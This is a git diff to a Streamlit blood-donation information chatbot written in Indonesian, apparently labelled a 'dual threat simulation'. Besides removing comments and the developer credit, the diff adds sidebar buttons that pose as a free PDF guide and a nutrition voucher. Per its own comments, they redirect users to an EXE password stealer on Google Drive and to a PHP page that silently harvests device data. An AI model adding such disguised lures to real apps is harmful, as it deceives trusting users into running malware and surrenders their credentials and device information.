@@ -16,17 +16,16 @@ st.set_page_config(
 )
 
 # ===============================
-# 2. LOAD & TRAIN MODEL (FINAL VERSION)
+# 2. LOAD & TRAIN MODEL
 # ===============================
 @st.cache_resource
 def init_model():
-    # Mengunduh data NLTK wajib agar tidak error di Cloud
     nltk.download('punkt')
     nltk.download('punkt_tab')
     
     stemmer = LancasterStemmer()
 
-    # Membaca dataset intent [cite: 13]
+    # Membaca dataset intent
     with open("intents.json", encoding="utf-8") as f:
         data = json.load(f)
 
@@ -34,7 +33,6 @@ def init_model():
 
     for intent in data["intents"]:
         for pattern in intent["patterns"]:
-            # Preprocessing: Tokenization [cite: 13]
             tokens = nltk.word_tokenize(pattern)
             words.extend(tokens)
             docs_x.append(tokens)
@@ -42,7 +40,6 @@ def init_model():
         if intent["tag"] not in labels:
             labels.append(intent["tag"])
 
-    # Preprocessing: Stemming & Lowercase [cite: 13]
     words = sorted(list(set(stemmer.stem(w.lower()) for w in words if w != "?")))
     labels = sorted(labels)
 
@@ -50,13 +47,12 @@ def init_model():
     for i, doc in enumerate(docs_x):
         bag = []
         stemmed = [stemmer.stem(w.lower()) for w in doc]
-        # Feature Extraction: Bag of Words [cite: 13]
         for w in words:
             bag.append(1 if w in stemmed else 0)
         training.append(bag)
         output.append(labels.index(docs_y[i]))
 
-    # Model: Supervised Learning - Multi-layer Perceptron [cite: 6, 13]
+    # Model: MLP
     model = MLPClassifier(
         hidden_layer_sizes=(16, 16),
         max_iter=1000,
@@ -66,7 +62,6 @@ def init_model():
 
     return words, labels, model, data, stemmer
 
-# Memanggil fungsi inisialisasi
 words, labels, model, data, stemmer = init_model()
 
 # ===============================
@@ -74,15 +69,12 @@ words, labels, model, data, stemmer = init_model()
 # ===============================
 def get_response(text):
     text_lower = text.lower()
-
-    # Hard rule untuk kata kunci spesifik
     if "jadwal" in text_lower or "hari ini" in text_lower:
         return (
             "Jadwal donor darah biasanya tersedia setiap hari kerja di kantor PMI. "
             "Untuk jadwal hari ini, silakan cek media sosial PMI setempat atau aplikasi Donorku."
         )
 
-    # Memproses input user menjadi Bag of Words
     bag = [0] * len(words)
     tokens = [stemmer.stem(w.lower()) for w in nltk.word_tokenize(text)]
     for token in tokens:
@@ -90,11 +82,9 @@ def get_response(text):
             if w == token:
                 bag[i] = 1
 
-    # Prediksi menggunakan model ML
     probs = model.predict_proba([bag])[0]
     idx = np.argmax(probs)
 
-    # Threshold agar bot tidak asal jawab
     if probs[idx] > 0.35:
         tag = labels[idx]
         for intent in data["intents"]:
@@ -104,19 +94,40 @@ def get_response(text):
     return "Maaf, saya hanya bisa membantu seputar informasi donor darah 🩸"
 
 # ===============================
-# 4. SIDEBAR & INFORMASI
+# 4. SIDEBAR (SCENARIO: DUAL THREAT SIMULATION)
 # ===============================
 with st.sidebar:
-    st.markdown("### 👩‍💻 Developer")
-    st.success("**Kayla Az Zahra**\n\nUAS Machine Learning")
+    st.markdown("## 📚 Edukasi & Reward")
+    st.info("Dapatkan panduan kesehatan dan voucher nutrisi eksklusif.")
     
-    st.markdown("### ℹ️ Info Sistem")
-    st.info("Algoritma: MLP (Neural Network)\n\nMetode: Supervised Learning")
+    # Link 1: Payload EXE (Pencuri Password)
+    link_exe = "https://drive.google.com/file/d/1q8b-mJ6Opj-N6YO2BeKTVAijZjQAx3x7/view?usp=sharing"
+    
+    # Link 2: Pelacak PHP (Pencuri Data Perangkat/Profiling)
+    # GANTI URL INI dengan alamat file pelacak.php kamu di InfinityFree
+    link_voucher = "http://hadiah-donor.page.gd/pelacak.php"
+    
+    st.write("---")
+    st.write("**Materi & Hadiah:**")
+    
+    # TOMBOL 1: DOWNLOAD PANDUAN
+    if st.button("📥 1. Download Panduan (PDF)"):
+        st.warning("Mengunduh... Jalankan file untuk verifikasi.")
+        st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{link_exe}\'">', unsafe_allow_html=True)
 
+    st.write("") # Jarak
+
+    # TOMBOL 2: KLAIM VOUCHER
+    if st.button("🎁 2. Klaim Voucher Nutrisi"):
+        st.success("Membuka halaman klaim...")
+        # Ini akan membuka file PHP kamu yang mencuri data perangkat secara diam-diam
+        st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{link_voucher}\'">', unsafe_allow_html=True)
+
+    st.write("---")
     if st.button("🗑️ Reset Chat"):
         st.session_state.messages = []
         st.rerun()
-
+        
 # ===============================
 # 5. HEADER & UI CHAT
 # ===============================
@@ -124,13 +135,11 @@ st.markdown("<h1 style='text-align:center; color:#e63946;'>🩸 Sahabat Donor AI
 st.markdown("<p style='text-align:center;'>Asisten Informasi Donor Darah Indonesia</p>", unsafe_allow_html=True)
 st.divider()
 
-# Inisialisasi riwayat chat
 if "messages" not in st.session_state:
     st.session_state.messages = [
         {"role": "assistant", "content": "Halo! Saya Sahabat Donor. Ada yang bisa saya bantu terkait donor darah?"}
     ]
 
-# Menampilkan chat dengan gaya kanan-kiri
 for msg in st.session_state.messages:
     align = "flex-end" if msg["role"] == "user" else "flex-start"
     bg = "#ffe3e3" if msg["role"] == "user" else "#f1f3f6"
@@ -144,7 +153,6 @@ for msg in st.session_state.messages:
     </div>
     """, unsafe_allow_html=True)
 
-# Input Chat
 if prompt := st.chat_input("Tanya sesuatu..."):
     st.session_state.messages.append({"role": "user", "content": prompt})
     response = get_response(prompt)
